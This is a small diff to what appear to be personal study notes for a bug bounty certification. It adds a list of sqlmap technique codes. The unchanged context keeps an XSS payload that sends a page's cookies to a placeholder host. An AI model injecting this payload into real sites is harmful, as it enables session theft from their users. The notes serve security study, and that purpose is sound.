@@ -52,3 +52,17 @@ Stuff for CBBH
 
     #To stealk cookies
     "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>
+
+  SQLmap
+
+    #Techniques and their meaning
+    B: Boolean-based blind
+    E: Error-based
+    U: Union query-based
+    S: Stacked queries
+    T: Time-based blind
+    Q: Inline queries
+
+
+    
+    
